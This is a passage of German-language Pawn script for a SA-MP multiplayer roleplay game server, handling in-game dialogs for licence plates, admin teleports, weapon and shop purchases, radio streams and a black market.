		    if(strlen(inputtext) == 2)
		    {
		        new mmerk = SAuto[playerid][0][sID];
		        new kenn[20],Float:xx,Float:yy,Float:zz,Float:aa;
		        GetVehiclePos(mmerk,xx,yy,zz);
		        GetVehicleZAngle(mmerk,aa);
		    	new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(mmerk, engine, lights, alarm, doors, bonnet, boot, objective);
				format(kenn,sizeof(kenn),"CI-%s-0",inputtext);
    			SetVehicleNumberPlate(SAuto[playerid][0][sID],kenn);
    			format(SAuto[playerid][0][sKennzeichen],10,"%s",kenn);
				SendClientMessage(playerid,COLOR_GREEN,"Du hast nun ein Kennzeichen für dein Fahrzeug. Das kostet dich 27.42$");
				GebeGeld(playerid,-27.42);
				SetVehicleToRespawn(mmerk);
				SetVehiclePos(mmerk,xx,yy,zz);
				SetVehicleZAngle(mmerk,aa);
				SetVehicleParamsEx(mmerk, engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
				Tuningladen(playerid,0);
		    }
		    else{
		    	ShowPlayerDialog(playerid,DIALOG_KFZ2,DIALOG_STYLE_INPUT,"Kennzeichen beantragen","Gebe bitte zwei Buchstaben oder Zahlen für dein Kennzeichen an","Beantragen","Abbrechen");
		    	SendClientMessage(playerid,COLOR_RED,"Gebe bitte zwei Buchstaben für dein Kennzeichen an!");
			}
		}
	}
	if(dialogid == DIALOG_KFZ3)
	{
		if(response)
		{
		    if(strlen(inputtext) == 2)
		    {
		        new mmerk = SAuto[playerid][1][sID];
		        new kenn[20],Float:xx,Float:yy,Float:zz,Float:aa;
		        GetVehiclePos(mmerk,xx,yy,zz);
		        GetVehicleZAngle(mmerk,aa);
		    	new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(mmerk, engine, lights, alarm, doors, bonnet, boot, objective);
				format(kenn,sizeof(kenn),"CI-%s-1",inputtext);
    			SetVehicleNumberPlate(SAuto[playerid][1][sID],kenn);
    			format(SAuto[playerid][1][sKennzeichen],10,"%s",kenn);
				SendClientMessage(playerid,COLOR_GREEN,"Du hast nun ein Kennzeichen für dein Fahrzeug. Das kostet dich 27.42$");
				GebeGeld(playerid,-27.42);
				SetVehicleToRespawn(mmerk);
				SetVehiclePos(mmerk,xx,yy,zz);
				SetVehicleZAngle(mmerk,aa);
				SetVehicleParamsEx(mmerk, engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
				Tuningladen(playerid,1);
		    }
		    else{
		    	ShowPlayerDialog(playerid,DIALOG_KFZ3,DIALOG_STYLE_INPUT,"Kennzeichen beantragen","Gebe bitte zwei Buchstaben oder Zahlen für dein Kennzeichen an","Beantragen","Abbrechen");
		    	SendClientMessage(playerid,COLOR_RED,"Gebe bitte zwei Buchstaben für dein Kennzeichen an!");
			}
		}
	}
	if(dialogid == DIALOG_ADMINPORT)
	{
	    if(response)
	    {
	        if(listitem == 0) { Teleport(playerid,1572.6523,-9528.2373,6.2106); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 1) { Teleport(playerid,1829.5779,-9283.4170,4.0341); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 2) { Teleport(playerid,1749.3882,-9190.1914,4.1822); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 3) { Teleport(playerid,1713.6134,-8828.2842,3.8460); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 4) { Teleport(playerid,1601.6307,-8498.1660,1.9561); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 5) { Teleport(playerid,1783.1035,-7519.4370,3.9935); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 6) { Teleport(playerid,4345.0049,-7708.7383,3.9923); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 7) { Teleport(playerid,4225.1680,-8564.0811,3.8215); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 8) { Teleport(playerid,4546.5161,-9289.1953,4.0248); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 9) { Teleport(playerid,5675.1499,-9308.4883,4.0248); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 10) { Teleport(playerid,6322.0410,-9348.6035,4.0291); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 11) { Teleport(playerid,6379.0884,-8694.3936,4.0209); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 12) { Teleport(playerid,6348.8125,-8141.3926,4.0601); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 13) { Teleport(playerid,6484.0298,-7874.5825,4.1904); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 14) { Teleport(playerid,6382.2793,-7728.2637,4.0008); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 15) { Teleport(playerid,4538.2319,-8672.3018,4.4169); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 16) { Teleport(playerid,4094.4719,-9282.6504,4.0378); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 17) { Teleport(playerid,6011.1929,-9849.6729,8.7101); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 18) { Teleport(playerid,3168.0671,-9249.9512,4.0298); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 19) { Teleport(playerid,1417.9299,-7540.6943,18.7634); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 20) { Teleport(playerid,1751.2831,-8116.3999,23.6663); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }
	        else if(listitem == 21) { Teleport(playerid,3723.0439,-9317.4150,4.0288); SetPlayerVirtualWorld(playerid,0); SetPlayerInterior(playerid,0); }

	        //Army Base\nFischmarkt\nFlughafen\nYakuza\nFlugzeugträger\nHotel//Biker
	    }
	}
	if(dialogid == DIALOG_SKINCHANGE)
	{
	    if(response)
	    {
			new frak,anzahl = 0;
		    if(SpielerInfo[playerid][uLeiter] != 0) frak = SpielerInfo[playerid][uLeiter]; else frak = SpielerInfo[playerid][uMitglied];
		    format(string,sizeof string,"");
		    for(new x = 0; x < sizeof(SkinModelle[]); x++)
		    {
		        if(SkinModelle[frak-1][x] != 0)
		        {
		            if(anzahl == listitem)
		            {
		                SetPlayerSkin(playerid,SkinModelle[frak-1][x]);
		                SpielerInfo[playerid][uSkin]= SkinModelle[frak-1][x];
		                SpielerInfo[playerid][uZiviFrak] = 1;
		                break;
		            }
		            anzahl++;
		        }
		    }
   		}
	}
	if(dialogid == DIALOG_SUPPORT)
	{
	    if(response)
	    {
	        if(strlen(inputtext) < 0) { SendClientMessage(playerid,COLOR_RED,"Gebe einen Text an!"); ShowPlayerDialog(playerid,DIALOG_SUPPORT,DIALOG_STYLE_INPUT,"Support","Gebe hier ein Thema für deine Meldung an die Admins ein:","Senden","Abbrechen"); return 1; }
			/*format(TicketTitel[playerid],128,"%s",inputtext);
			ShowPlayerDialog(playerid,DIALOG_SUPPORT2,DIALOG_STYLE_INPUT,"Support","Gebe hier den Text für die Meldung ein:","Senden","Abbrechen");*/
			format(string,sizeof string,"Neues Ticket von %s[%d] Grund: %s",PlayerName(playerid),playerid,inputtext);
			SendAdminMessage(0xFF6400FF,string,1);
			Ticketplayer[playerid] = 1;
			SendClientMessage(playerid,0xFF6400FF,"Ticket abgesendet!");
		}
	}
 	#define DIALOG_WAFFENKAUF_PISTOLEN 1000
 	#define DIALOG_WAFFENKAUF_GEWEHRE 1001
 	#define DIALOG_WAFFENKAUF_SMG 1002
 	#define DIALOG_WAFFENKAUF_MUNITION 1003
 	if(dialogid == DIALOG_WAFFENKAUF)
 	{
 	    if(response)
 	    {
 	    	if(listitem == 0)
            {
			  	ShowPlayerDialog(playerid, DIALOG_WAFFENKAUF_PISTOLEN, DIALOG_STYLE_LIST, "Pistolen", "Pistole 800$\nSD-Pistole 900$\nDesert Eagle 1000$", "Weiter", "Abbrechen");
            }
            else if(listitem == 1)
            {
   	       	  	ShowPlayerDialog(playerid, DIALOG_WAFFENKAUF_GEWEHRE, DIALOG_STYLE_LIST, "Gewehre", "Schrotflinte 1200$\nAbgesägte-Schrotflinten 2600$\nCountry Rifle 1300$\nAK-47 2300$\nM4 2800$", "Weiter", "Abbrechen");
            }
			else if(listitem == 2)
			{
				ShowPlayerDialog(playerid, DIALOG_WAFFENKAUF_SMG, DIALOG_STYLE_LIST, "Schnellfeuer Waffen", "MP5 2200$\nMicro SMG 1800$\nTec9 1700$", "Weiter", "Abbrechen");
			}
 	    }
 	}
 	if(dialogid == DIALOG_WAFFENKAUF_PISTOLEN)
 	{
 	    if(response)
 	    {
			if(listitem == 0)
			{
				Waffenid[playerid] = 22;
				Kosten[playerid] = 800;
				ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
			}
			if(listitem == 1)
			{
				Waffenid[playerid] = 23;
				Kosten[playerid] = 900;
				ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
			}
			if(listitem == 2)
			{
				Waffenid[playerid] = 24;
				Kosten[playerid] = 1000;
				ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
			}
 	    }
 	}
 	if(dialogid == DIALOG_WAFFENKAUF_GEWEHRE)
 	{
 	    if(response)
 	    {
			if(listitem == 0)
			{
			    Waffenid[playerid] = 25;
			    Kosten[playerid] = 1200;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
	   		if(listitem == 1)
			{
			    Waffenid[playerid] = 26;
			    Kosten[playerid] = 2600;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
	   		if(listitem == 2)
			{
			    Waffenid[playerid] = 33;
			    Kosten[playerid] = 1300;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
	   		if(listitem == 3)
			{
			    Waffenid[playerid] = 30;
			    Kosten[playerid] = 2300;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
	   		if(listitem == 4)
			{
			    Waffenid[playerid] = 31;
			    Kosten[playerid] = 2800;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
		}
 	}
 	if(dialogid == DIALOG_WAFFENKAUF_SMG)
 	{
 	    if(response)
 	    {
			if(listitem == 0)
			{
			    Waffenid[playerid] = 29;
			    Kosten[playerid] = 2200;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
	   		if(listitem == 1)
			{
			    Waffenid[playerid] = 28;
			    Kosten[playerid] = 1800;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
	   		if(listitem == 2)
			{
			    Waffenid[playerid] = 32;
			    Kosten[playerid] = 1700;
			    ShowPlayerDialog(playerid,DIALOG_WAFFENKAUF_MUNITION, DIALOG_STYLE_INPUT, "Munition", "Gib an wie viel Muniton du kaufen willst (1$ / Schuss):", "Kaufen", "Abbrechen");
	   		}
 	    }

 	}
 	if(dialogid == DIALOG_WAFFENKAUF_MUNITION)
	{
		if(response)
		{
		    /*new data[5];
			mysqlget("geschäfte","Name='AmmuNation'","ID",data);*/
			new waffenmuni = strval(inputtext);
			if(waffenmuni > 999)
			{
			    waffenmuni = 999;
			    SendClientMessage(playerid,COLOR_RED,"Du kannst nicht mehr als 999 Munition kaufen!");
			}
			if(waffenmuni > 0)
			{
				if(SpielerInfo[playerid][uGeld] < (Kosten[playerid]+waffenmuni) && SpielerInfo[playerid][uKonto] < (Kosten[playerid]+waffenmuni)) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
				if(SpielerInfo[playerid][uGeld] < (Kosten[playerid]+waffenmuni)) KontoGeld(playerid,-(Kosten[playerid]+waffenmuni),"Waffenkauf");
				else GebeGeld(playerid,-(Kosten[playerid]+waffenmuni));
				GebeWaffe(playerid, Waffenid[playerid], waffenmuni);
				format(string,sizeof string,"Waffe mit %d Muniton für %d$ gekauft!",waffenmuni,waffenmuni+Kosten[playerid]);
				SendClientMessage(playerid,COLOR_GREEN,string);
				BizInfo[4][bkasse] += (waffenmuni+Kosten[playerid]+0.01)/20;Geschaftspeichern(4);
			}else{SendClientMessage(playerid,COLOR_RED,"Du kannst keine -Munition kaufen!");printf("%s muni im minus",PlayerName(playerid));}
		}
	}
	if(dialogid == DIALOG_AUFZUG)
	{
	    if(response)
	    {
	        if(AufzugBereit == 0) return SendClientMessage(playerid,COLOR_RED,"Der Aufzug ist bereits in Betrieb!");
			AufzugBewegen(listitem);
			format(string,sizeof string,"Der Aufzug ist nun unterwegs zu Etage %d.",listitem);
			SendClientMessage(playerid,COLOR_GREEN,string);
	    }
	}
	if(dialogid == DIALOG_RADIO)
	{
	    if(response == 1)
	    {
	        StopAudioStreamForPlayer(playerid);
	        switch(listitem)
	        {
	            case 0:
	            {
	                playerradio[playerid] = 1;
	                PlayAudioStreamForPlayer(playerid, "https://iloveradio.de/iloveradio.m3u");
	            }
	            case 1:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/listen.m3u");
				}
				case 2:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/listen.m3u");
				}
				case 3:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://listen.technobase.fm/dsl.pls");
				}
				case 4:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://listen.housetime.fm/dsl.pls");
				}
				case 5:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://listen.hardbase.fm/dsl.pls");
				}
				case 6:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://listen.trancebase.fm/dsl.pls");
				}
				case 7:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://listen.coretime.fm/dsl.pls");
				}
				case 8:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://listen.clubtime.fm/dsl.pls");
				}
				case 9:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://listen.di.fm/public2/electro.pls");
				}
				case 10:
				{
				    playerradio[playerid] = 1;
				    PlayAudioStreamForPlayer(playerid, "https://files.hard.fm/listen.pls");
				}
				case 11:
				{
					StopAudioStreamForPlayer(playerid);
				}
			}
		}
	}
	if(dialogid == DIALOG_SHOP)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				if(SpielerInfo[playerid][uGeld] < 2) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
				Verstauen(playerid,19346,1);
				SendClientMessage(playerid,COLOR_GREEN,"Hotdog gekauft! Nutze /inventar");
				GebeGeld(playerid,-2);
				if(SpielerInfo[playerid][ufShop] == 0)
		        {
		        	SpielerInfo[playerid][ufShop] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 100;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
    			if(inwelchemladen[playerid] == 0){BizInfo[1][bkasse] += 2.0; Geschaftspeichern(1);}
	            else{BizInfo[8][bkasse] += 2.0; Geschaftspeichern(8);}
	        }
	        if(listitem == 6)
	        {

				if(SpielerInfo[playerid][uGeld] < 80) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
				if(!Verstauen(playerid,18632,1)) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits eine Angel oder es ist kein Platz mehr im Inventar!");
				SendClientMessage(playerid,COLOR_GREEN,"Angel gekauft! Nutze /inventar");
				GebeGeld(playerid,-80);
				if(SpielerInfo[playerid][ufShop] == 0)
		        {
		        	SpielerInfo[playerid][ufShop] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 150;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
    			if(inwelchemladen[playerid] == 0){BizInfo[1][bkasse] += 80.0; Geschaftspeichern(1);}
	            else{BizInfo[8][bkasse] += 80.0; Geschaftspeichern(8);}
	        }
	        if(listitem == 7)
	        {

				if(SpielerInfo[playerid][uGeld] < 120) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
				if(!Verstauen(playerid,2226,1)) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits eine Musikbox oder es ist kein Platz mehr im Inventar!");
				SendClientMessage(playerid,COLOR_GREEN,"Musikbox gekauft! Nutze /musikbox");
				GebeGeld(playerid,-120);
				if(SpielerInfo[playerid][ufShop] == 0)
		        {
		        	SpielerInfo[playerid][ufShop] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 150;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
				if(inwelchemladen[playerid] == 0){BizInfo[1][bkasse] += 120.0; Geschaftspeichern(1);}
	            else{BizInfo[8][bkasse] += 120.0; Geschaftspeichern(8);}
	        }
	        if(listitem == 1)
	        {

				if(SpielerInfo[playerid][uGeld] < 5) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
				if(SpielerInfo[playerid][uTelefonbuch] == 1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt bereits ein Telefonbuch!");
				SpielerInfo[playerid][uTelefonbuch] = 1;
				SendClientMessage(playerid,COLOR_GREEN,"Telefonbuch gekauft! Benutze /nummer [Name/ID].");
				GebeGeld(playerid,-5);
				if(SpielerInfo[playerid][ufShop] == 0)
		        {
		        	SpielerInfo[playerid][ufShop] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 150;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
				if(inwelchemladen[playerid] == 0){BizInfo[1][bkasse] += 5.0; Geschaftspeichern(1);}
	            else{BizInfo[8][bkasse] += 5.0; Geschaftspeichern(8);}
	        }
	        if(listitem == 2)
	        {
				if(SpielerInfo[playerid][uGeld] < 200) { SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");  return 1; }
				if(SpielerInfo[playerid][uHandy] == 1) { SendClientMessage(playerid,COLOR_RED,"Du besitzt bereits ein Handy!");  return 1; }
				SpielerInfo[playerid][uHandy] = 1;
				SendClientMessage(playerid,COLOR_GREEN,"Handy gekauft! Nutze /handy");
				GebeGeld(playerid,-200);
				new Gefunden = true,nummer;
				while(Gefunden)
				{
				    nummer = 10001+random(50000);
				    new data[5];
				    format(data,sizeof data,"-1");
				    format(string,sizeof string,"Handynummer='%d'",nummer);
				    if(!mysqlget("user",string,"userID",data)) Gefunden = false;
				    if(strval(data) == -1) Gefunden = false;
				}
				SpielerInfo[playerid][uHandynummer] = nummer;
				format(string,sizeof string,"Deine Handynummer lautet: %d",nummer);
				SendClientMessage(playerid,COLOR_GREEN,string);
				if(SpielerInfo[playerid][ufShop] == 0)
		        {
		        	SpielerInfo[playerid][ufShop] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 150;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
				if(SpielerInfo[playerid][ufHandy] == 0)
		        {
		        	SpielerInfo[playerid][ufHandy] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 150;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
				if(inwelchemladen[playerid] == 0){BizInfo[1][bkasse] += 200.0; Geschaftspeichern(1);}
	            else{BizInfo[8][bkasse] += 200.0; Geschaftspeichern(8);}
				ShowPlayerDialog(playerid,DIALOG_TELEBUCH,DIALOG_STYLE_MSGBOX,"Telefonbuch","Möchtest du deine Nummer ins Telefonbuch eintragen lassen?\nDadurch haben andere Spieler die Möglichkeit deine Nummer zu suchen.","Ja","Nein");
	        }
	        if(listitem == 3)
	        {
	            new sovielhater = 0;
	            for(new x = 0; x < sizeof(SpielerInventar[]); x++)
				{
					if(SpielerInventar[playerid][x][0] != -1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1486)
					{
					    sovielhater = SpielerInventar[playerid][x][1];
					}
				}
	            new pfandstring[300];
	            format(pfandstring,sizeof(pfandstring),"Du besitzt %d Pfandflaschen! Wie viele Pfandflaschen willst du verkaufen?\nDu bekommst 0,25$ pro Flasche!",sovielhater);
				ShowPlayerDialog(playerid,DIALOG_PFAND,DIALOG_STYLE_INPUT,"Pfandflaschen",pfandstring,"Verkaufen","Abbrechen");
				if(SpielerInfo[playerid][ufShop] == 0)
		        {
		        	SpielerInfo[playerid][ufShop] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 150;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
	        }
	        if(listitem == 4)
	        {
	            new online = 0;
	            for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && IstSpielerInFrak(i,5))
				    {
				        online ++;
						break;
				    }
				}
				if(online > 0)
				{
				    SendClientMessage(playerid,COLOR_RED,"Es sind Leute vom Towing Service online! Daher kannst du kein Kit kaufen!");
				}
				else
				{
				    if(SpielerInfo[playerid][uGeld] < 250) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
				    SendClientMessage(playerid,COLOR_GREEN,"Du hast dir ein Fahrzeugkit für 250$ gekauft! Du kannst es im /Inventar finden!");
				    GebeGeld(playerid,-250);
				    Verstauen(playerid,3096,1);
				    if(SpielerInfo[playerid][ufShop] == 0)
			        {
			        	SpielerInfo[playerid][ufShop] = 1;
			        	Missionenaktu(playerid);
			        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
			        	new Float:belohnung;
		            	belohnung = 150;
		            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
						GebeGeld(playerid,belohnung);
					}
				    if(inwelchemladen[playerid] == 0){BizInfo[1][bkasse] += 250.0; Geschaftspeichern(1);}
	            	else{BizInfo[8][bkasse] += 250.0; Geschaftspeichern(8);}
				}
	        }
        	if(listitem == 5)
	        {
	            if(PlayerTruckmodus[playerid] == 3)
	            {
	                SendClientMessage(playerid,COLOR_GREEN,"Danke für die Lieferung! Hier sind die 60$");
					GebeGeld(playerid,60);
	                PlayerTruckmodus[playerid] = 4;
    				ClearAnimations(playerid);
				    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
				    RemovePlayerAttachedObject(playerid, 9);
	            }
	            else if(PlayerTruckmodus[playerid] == 5)
	            {
	                SendClientMessage(playerid,COLOR_GREEN,"Danke für die Lieferung! Hier sind die 160$");
	                GebeGeld(playerid,160);
	                PlayerTruckmodus[playerid] = 6;
    				ClearAnimations(playerid);
				    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
				    RemovePlayerAttachedObject(playerid, 9);
        	    }
				else SendClientMessage(playerid,COLOR_RED,"Du kannst hier zurzeit keine Produkte abliefern!");
	        }
	        if(listitem == 8)
	        {
	            if(SpielerInfo[playerid][uGeld] < 40) { SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");  return 1; }
	            Verstauen(playerid,1650,1);GebeGeld(playerid,-40);
				SendClientMessage(playerid,COLOR_GREEN,"Du hast einen Benzinkanister gekauft! Er ist nun in deinem Inventar");
				if(SpielerInfo[playerid][ufShop] == 0)
		        {
		        	SpielerInfo[playerid][ufShop] = 1;
		        	Missionenaktu(playerid);
		        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Kunde im 24/7 {0080FF}(/missionen)");
		        	new Float:belohnung;
	            	belohnung = 150;
	            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
					GebeGeld(playerid,belohnung);
				}
				if(inwelchemladen[playerid] == 0){BizInfo[1][bkasse] += 40.0; Geschaftspeichern(1);}
	            else{BizInfo[8][bkasse] += 40.0; Geschaftspeichern(8);}

	        }
	    }

	}
	if(dialogid == DIALOG_SCHWARZM)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(SpielerInfo[playerid][uLevel] >= 2)
	            {
	        		ShowPlayerDialog(playerid, DIALOG_WAFFENKAUF, DIALOG_STYLE_LIST, "Waffenkauf", "Pistolen\nGewehre und Sturmgewehre\nSchnellfeuerwaffen", "Weiter", "Abbrechen");
				}
				else{SendClientMessage(playerid,COLOR_RED,"Du benötigst hierfür mindestens Level 2!");}
			}
			if(listitem == 1)
			{
                CallLocalFunction("cmd_inventar","d",playerid);
			}
		}
	}
	if(dialogid == DIALOG_FISCHSM2)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            fischauswahl[playerid] = 7;
	            ShowPlayerDialog(playerid,DIALOG_FISCHSM,DIALOG_STYLE_INPUT,"Fisch verkauf","Wie viele Schildkröten möchtest du eintauschen? ( 3g Koks pro Schildkröte )","Verkaufen","Abbrechen");
	        }
	        if(listitem == 1)
	        {
	            fischauswahl[playerid] = 4;
	            ShowPlayerDialog(playerid,DIALOG_FISCHSM,DIALOG_STYLE_INPUT,"Fisch verkauf","Wie viele Schildkröten möchtest du verkaufen? ( 350$ pro Schildkröte )","Verkaufen","Abbrechen");
	        }
	    }
	}
	if(dialogid == DIALOG_FISCHSM)
